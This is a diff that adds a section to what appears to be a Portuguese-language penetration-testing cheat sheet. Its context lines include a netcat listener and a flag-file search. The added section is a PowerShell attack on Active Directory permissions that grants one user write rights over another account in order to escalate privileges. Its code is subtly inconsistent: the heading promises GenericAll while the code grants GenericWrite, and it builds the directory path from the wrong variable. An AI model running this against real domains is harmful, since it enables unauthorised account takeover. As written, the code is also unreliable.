@@ -978,3 +978,19 @@ nc -nvlp 666
 ```
 find / -name local.txt 2> /dev/null
 ```
+## ATTACK - DOMAIN ACLS
+##### ATAQUE - SE SOU OWNER DO USUARIO
+DAR PERMISSÃO GENERICALL PARA VEGETA SOBRE CHICHI
+```
+$MyAdmin = (get-aduser vegeta).sid
+$MyUser = (get-aduser chichi)
+$MyDistinguishedName = ($Myuser).distinguishedname
+$MyDistinguishedNameAD = $MyDistinguishedName = "AD:$MyUser"
+$MyACL= Get-ACL $MyDistinguishedNameAD
+$MyADRights = [System.DirectoryServices.ActiveDirectoryRights] "GenericWrite"
+$MyType = [System.Security.AccessControl.AccessControlType] "Allow"
+$MyInheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "All"
+$MyACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $MyAdmin,$MyADRights,$MyType,$MyInheritanceType
+$MyACL.AddAccessRule($MyACE)
+Set-acl -aclobject $MyACL $MyDistinguishedNameAD
+```
